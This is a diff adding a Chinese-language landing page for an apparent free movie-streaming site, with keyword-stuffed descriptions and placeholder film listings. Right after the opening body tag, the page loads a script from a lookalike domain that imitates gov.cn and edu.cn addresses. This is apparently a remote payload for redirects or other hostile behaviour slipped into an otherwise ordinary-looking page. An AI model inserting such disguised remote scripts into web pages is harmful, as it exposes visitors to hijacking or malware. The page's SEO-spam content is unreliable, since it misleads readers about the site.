@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="秋霞电影网 影音先锋，专注提供高清电影、热门电视剧、综艺动漫、纪录片等海量影视资源在线观看与资讯。汇集院线大片、经典老片、海外剧集，支持多线路播放，每日更新，畅享极致影音体验。">
+<meta name="keywords" content="秋霞电影网 影音先锋,高清电影,在线影视,免费电影,热门电视剧,综艺节目,动漫番剧,纪录片,院线大片,经典影视,影视资讯">
+<meta name="author" content="秋霞电影网 影音先锋">
+<meta name="robots" content="index, follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>秋霞电影网 影音先锋 - 高清影视在线观看首选平台 | qiuxiadianyingwangyingyinxianfeng-app.github.io</title>
+<link rel="canonical" href="https://qiuxiadianyingwangyingyinxianfeng-app.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0e17;
+  --card:#121a2b;
+  --line:#1e2b45;
+  --txt:#e8edf7;
+  --sub:#8b9bb5;
+  --acc:#ff5a5f;
+  --acc2:#ffb347;
+  --grad:linear-gradient(135deg,#ff5a5f 0%,#ffb347 100%);
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",Helvetica,Arial,sans-serif;
+  background:var(--bg);
+  color:var(--txt);
+  line-height:1.7;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none;transition:.25s}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+
+/* 顶部导航 */
+.nav{
+  position:sticky;top:0;z-index:99;
+  background:rgba(10,14,23,.92);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.nav-in{display:flex;align-items:center;gap:14px;height:58px}
+.logo{
+  font-size:19px;font-weight:800;letter-spacing:.5px;
+  background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;
+  white-space:nowrap;
+}
+.logo span{color:var(--acc)}
+.menu{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+.menu a{
+  padding:7px 13px;border-radius:20px;font-size:14px;color:var(--sub);
+}
+.menu a:hover{color:var(--txt);background:var(--card)}
+
+/* 首屏 */
+.hero{
+  padding:64px 0 50px;
+  background:
+    radial-gradient(1200px 400px at 80% -10%,rgba(255,90,95,.18),transparent 60%),
+    radial-gradient(900px 360px at 0% 10%,rgba(255,179,71,.12),transparent 55%);
+}
+.hero h1{
+  font-size:clamp(28px,5vw,46px);line-height:1.25;font-weight:900;
+  margin-bottom:16px;
+}
+.hero h1 em{font-style:normal;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--sub);max-width:680px;font-size:16px}
+.hero-acts{margin-top:26px;display:flex;gap:12px;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:13px 26px;border-radius:30px;font-size:15px;font-weight:700;
+}
+.btn-main{background:var(--grad);color:#1a0c0c}
+.btn-ghost{border:1px solid var(--line);color:var(--txt)}
+.chips{margin-top:30px;display:flex;gap:10px;flex-wrap:wrap}
+.chip{padding:6px 14px;border-radius:16px;font-size:13px;background:var(--card);color:var(--sub);border:1px solid var(--line)}
+
+/* 通用区块 */
+.sec{padding:52px 0}
+.sec-h{display:flex;align-items:flex-end;gap:12px;margin-bottom:26px;flex-wrap:wrap}
+.sec-h h2{font-size:24px;font-weight:800}
+.sec-h h2 i{font-style:normal;color:var(--acc)}
+.sec-h .more{margin-left:auto;font-size:13px;color:var(--sub)}
+.sec-h .more:hover{color:var(--acc2)}
+
+/* 卡片网格 */
+.grid{display:grid;gap:18px}
+.g4{grid-template-columns:repeat(4,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+.g2{grid-template-columns:repeat(2,1fr)}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.card:hover{border-color:var(--acc);transform:translateY(-4px)}
+.thumb{position:relative;aspect-ratio:3/4;background:linear-gradient(160deg,#1a2740,#0f1626)}
+.thumb::after{
+  content:"";position:absolute;inset:0;
+  background:
+    linear-gradient(180deg,transparent 40%,rgba(0,0,0,.85)),
+    repeating-linear-gradient(45deg,rgba(255,255,255,.03) 0 6px,transparent 6px 12px);
+}
+.tag{
+  position:absolute;top:10px;left:10px;z-index:2;
+  padding:4px 10px;border-radius:6px;font-size:12px;font-weight:700;
+}
+.tag.hot{background:var(--acc);color:#fff}
+.tag.new{background:var(--acc2);color:#1a0c0c}
+.score{
+  position:absolute;top:10px;right:10px;z-index:2;
+  width:38px;height:38px;border-radius:50%;display:grid;place-items:center;
+  background:rgba(10,14,23,.75);border:1px solid var(--acc);color:var(--acc2);font-weight:800;font-size:14px;
+}
+.card-b{padding:13px 15px}
+.card-b h3{font-size:15px;margin-bottom:8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.meta{display:flex;justify-content:space-between;font-size:12px;color:var(--sub)}
+
+/* 分类条 */
+.cats{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:22px}
+.cat{padding:8px 18px;border-radius:22px;font-size:14px;background:var(--card);border:1px solid var(--line);color:var(--sub)}
+.cat.on,.cat:hover{background:var(--grad);color:#1a0c0c;border-color:transparent;font-weight:700}
+
+/* 资讯列表 */
+.news li{list-style:none;display:flex;gap:14px;padding:16px 0;border-bottom:1px dashed var(--line)}
+.news li:last-child{border-bottom:0}
+.news .idx{flex:0 0 34px;height:34px;border-radius:9px;display:grid;place-items:center;font-weight:800;color:var(--acc2);background:var(--card);border:1px solid var(--line);font-size:15px}
+.news .txt{flex:1;min-width:0}
+.news .txt h4{font-size:15px;margin-bottom:6px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.news .txt p{font-size:13px;color:var(--sub);overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical}
+.news .date{flex:0 0 74px;text-align:right;font-size:12px;color:var(--sub)}
+
+/* 数据条 */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.stat{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:22px 16px;text-align:center}
+.stat b{display:block;font-size:30px;font-weight:900;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.stat span{font-size:13px;color:var(--sub)}
+
+/* 关于 */
+.about{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:30px}
+.about p{color:#c3cfe0;margin-bottom:12px;font-size:15px}
+.about p:last-child{margin-bottom:0}
+.ft{text-align:center;padding:30px 18px;color:var(--sub);font-size:13px;border-top:1px solid var(--line);margin-top:20px}
+.ft b{color:var(--txt)}
+
+/* 响应式 */
+@media(max-width:900px){
+  .g4{grid-template-columns:repeat(3,1fr)}
+  .g3{grid-template-columns:repeat(2,1fr)}
+  .stats{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:640px){
+  .nav-in{height:52px}
+  .logo{font-size:16px}
+  .menu a{padding:6px 9px;font-size:13px}
+  .hero{padding:38px 0 32px}
+  .g4,.g3,.g2{grid-template-columns:repeat(2,1fr);gap:12px}
+  .sec{padding:36px 0}
+  .sec-h h2{font-size:20px}
+  .news li{flex-wrap:wrap}
+  .news .date{flex:1 1 100%;text-align:left}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="nav">
+  <div class="wrap nav-in">
+    <a class="logo" href="#top">秋霞<span>电影网</span> · 影音先锋</a>
+    <nav class="menu">
+      <a href="#hot">热播榜</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">剧集</a>
+      <a href="#show">综艺</a>
+      <a href="#news">资讯</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero" id="top">
+  <div class="wrap">
+    <h1>秋霞电影网 影音先锋<br><em>高清影视在线观看首选平台</em></h1>
+    <p>汇聚院线大片、经典老片、热播剧集、综艺动漫与纪录片，多线路极速播放，每日更新不间断。无论动作、爱情、悬疑、科幻还是喜剧，这里都能找到属于你的那一部。</p>
+    <div class="hero-acts">
+      <a class="btn btn-main" href="#hot">立即观影 →</a>
+      <a class="btn btn-ghost" href="#about">了解平台</a>
+    </div>
+    <div class="chips">
+      <span class="chip">1080P 高清</span>
+      <span class="chip">每日更新</span>
+      <span class="chip">多线路播放</span>
+      <span class="chip">全品类影视</span>
+      <span class="chip">免费观看</span>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="hot">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2>今日 <i>热播榜</i></h2>
+      <a class="more" href="#">查看完整榜单 ›</a>
+    </div>
+    <div class="grid g4">
+      <article class="card">
+        <div class="thumb"><span class="tag hot">热播</span><span class="score">9.2</span></div>
+        <div class="card-b">
+          <h3>边缘追缉令</h3>
+          <div class="meta"><span>动作 / 犯罪</span><span>2026</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb"><span class="tag new">新片</span><span class="score">8.7</span></div>
+        <div class="card-b">
+          <h3>长安二十四计</h3>
+          <div class="meta"><span>悬疑 / 古装</span><span>2026</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb"><span class="tag hot">热播</span><span class="score">9.0</span></div>
+        <div class="card-b">
+          <h3>星际回响</h3>
+          <div class="meta"><span>科幻 / 冒险</span><span>2026</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb"><span class="tag new">新片</span><span class="score">8.4</span></div>
+        <div class="card-b">
+          <h3>春日迟迟</h3>
+          <div class="meta"><span>爱情 / 都市</span><span>2026</span></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="movie" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2>电影 <i>频道</i></h2>
+      <div class="cats">
+        <a class="cat on" href="#">全部</a>
+        <a class="cat" href="#">动作</a>
+        <a class="cat" href="#">喜剧</a>
+        <a class="cat" href="#">爱情</a>
+        <a class="cat" href="#">科幻</a>
+        <a class="cat" href="#">恐怖</a>
+      </div>
+    </div>
+    <div class="grid g4">
+      <article class="card"><div class="thumb"><span class="tag hot">推荐</span></div><div class="card-b"><h3>极速狂飙</h3><div class="meta"><span>动作</span><span>HD</span></div></div></article>
+      <article class="card"><div class="thumb"><span class="tag new">上映</span></div><div class="card-b"><h3>月光备忘录</h3><div class="meta"><span>爱情</span><span>HD</span></div></div></article>
+      <article class="card"><div class="thumb"></div><div class="card-b"><h3>笑傲江湖之重启</h3><div class="meta"><span>武侠 / 喜剧</span><span>HD</span></div></div></article>
+      <article class="card"><div class="thumb"><span class="tag hot">经典</span></div><div class="card-b"><h3>深海谜城</h3><div class="meta"><span>悬疑 / 惊悚</span><span>4K</span></div></div></article>
+      <article class="card"><div class="thumb"></div><div class="card-b"><h3>铁血柔情</h3><div class="meta"><span>战争 / 剧情</span><span>HD</span></div></div></article>
+      <article class="card"><div class="thumb"><span class="tag new">新片</span></div><div class="card-b"><h3>时光代理人</h3><div class="meta"><span>科幻</span><span>HD</span></div></div></article>
+      <article class="card"><div class="thumb"></div><div class="card-b"><h3>荒野求生记</h3><div class="meta"><span>冒险</span><span>HD</span></div></div></article>
+      <article class="card"><div class="thumb"><span class="tag hot">高分</span></div><div class="card-b"><h3>无声告白</h3><div class="meta"><span>剧情</span><span>HD</span></div></div></article>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="tv" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2>剧集 <i>推荐</i></h2>
+      <a class="more" href="#">更多剧集 ›</a>
+    </div>
+    <div class="grid g3">
+      <article class="card">
+        <div class="thumb" style="aspect-ratio:16/9"><span class="tag hot">连载</span><span class="score">9.4</span></div>
+        <div class="card-b"><h3>大明监察录</h3><div class="meta"><span>古装 / 权谋</span><span>更新至 28 集</span></div></div>
+      </article>
+      <article class="card">
+        <div class="thumb" style="aspect-ratio:16/9"><span class="tag new">独家</span><span class="score">8.9</span></div>
+        <div class="card-b"><h3>急诊科故事</h3><div class="meta"><span>都市 / 医疗</span><span>更新至 16 集</span></div></div>
+      </article>
+      <article class="card">
+        <div class="thumb" style="aspect-ratio:16/9"><span class="tag hot">口碑</span><span class="score">9.1</span></div>
+        <div class="card-b"><h3>北境风云</h3><div class="meta"><span>年代 / 剧情</span><span>全 42 集</span></div></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="show" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2>综艺 · 动漫 · 纪录片</h2>
+      <a class="more" href="#">频道大全 ›</a>
+    </div>
+    <div class="grid g3">
+      <article class="card">
+        <div class="thumb" style="aspect-ratio:16/9"><span class="tag new">综艺</span></div>
+        <div class="card-b"><h3>欢乐星期五</h3><div class="meta"><span>真人秀 / 搞笑</span><span>每周五更新</span></div></div>
+      </article>
+      <article class="card">
+        <div class="thumb" style="aspect-ratio:16/9"><span class="tag hot">动漫</span></div>
+        <div class="card-b"><h3>灵剑山外传</h3><div class="meta"><span>热血 / 奇幻</span><span>连载中</span></div></div>
+      </article>
+      <article class="card">
+        <div class="thumb" style="aspect-ratio:16/9"><span class="tag hot">纪录片</span></div>
+        <div class="card-b"><h3>大河文明</h3><div class="meta"><span>历史 / 自然</span><span>全 6 集</span></div></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="news" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2>影视 <i>资讯</i></h2>
+      <a class="more" href="#">资讯首页 ›</a>
+    </div>
+    <ul class="news">
+      <li><span class="idx">01</span><div class="txt"><h4>2026 国庆档票房破纪录，多部国产大片领跑</h4><p>今年国庆档竞争激烈，多部影片凭借扎实口碑实现票房逆跌，观众观影热情持续高涨。</p></div><span class="date">10-06</span></li>
+      <li><span class="idx">02</span><div class="txt"><h4>科幻新作《星际回响》口碑发酵，特效获赞</h4><p>该片以硬核科学设定结合细腻情感叙事，被影评人称为年度最具诚意的国产科幻作品。</p></div><span class="date">10-05</span></li>
+      <li><span class="idx">03</span><div class="txt"><h4>经典港片 4K 修复版陆续上线，重温黄金时代</h4><p>一批 90 年代经典作品完成高清修复，画质与音效全面升级，老片焕发新生。</p></div><span class="date">10-03</span></li>
+      <li><span class="idx">04</span><div class="txt"><h4>悬疑剧《长安二十四计》热度登顶，反转不断</h4><p>紧凑的叙事节奏与层层递进的阴谋设计，让该剧成为近期讨论度最高的剧集之一。</p></div><span class="date">10-01</span></li>
+      <li><span class="idx">05</span><div class="txt"><h4>观影指南：十月值得期待的五部新片</h4><p>从文艺剧情到商业大片，我们为你精选了本月最不容错过的影院与线上佳作。</p></div><span class="date">09-29</span></li>
+    </ul>
+  </div>
+</section>
+
+<section class="sec" style="padding-top:0">
+  <div class="wrap">
+    <div class="stats">
+      <div class="stat"><b>12万+</b><span>影视资源</span></div>
+      <div class="stat"><b>每日</b><span>内容更新</span></div>
+      <div class="stat"><b>1080P</b><span>高清画质</span></div>
+      <div class="stat"><b>多线路</b><span>极速播放</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="about" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h"><h2>关于 <i>秋霞电影网 影音先锋</i></h2></div>
+    <div class="about">
+      <p><b style="color:var(--acc2)">秋霞电影网 影音先锋</b> 是一个专注于高清影视在线观看与影视资讯分享的平台，致力于为影迷提供便捷、流畅、丰富的观影体验。平台内容涵盖电影、电视剧、综艺、动漫、纪录片等多个品类，从院线热映到经典重温，从国产佳作到海外剧集，力求做到类型齐全、更新及时。</p>
+      <p>在播放体验上，秋霞电影网 影音先锋 提供多线路切换与多种清晰度选择，支持 1080P 乃至更高画质，配合简洁易用的界面与智能推荐，让找片、看片变得轻松自然。无论你是动作片爱好者、文艺片拥趸，还是追剧达人、纪录片迷，都能在这里发现心仪之作。</p>
+      <p>官方网址：<b style="color:var(--txt)">https://qiuxiadianyingwangyingyinxianfeng-app.github.io</b>，请认准官方域名，获取最新影视资源与资讯。</p>
+    </div>
+  </div>
+</section>
+
+<footer class="ft">
+  <div class="wrap">
+    <p><b>秋霞电影网 影音先锋</b> · 高清影视在线观看平台</p>
+    <p>网站网址：https://qiuxiadianyingwangyingyinxianfeng-app.github.io　|　免责声明：本网站仅提供影视资讯与索引服务，资源版权归原作者所有。</p>
+    <p>© 2026 秋霞电影网 影音先锋 All Rights Reserved.</p>
+  </div>
+</footer>
+
+</body>
+</html>
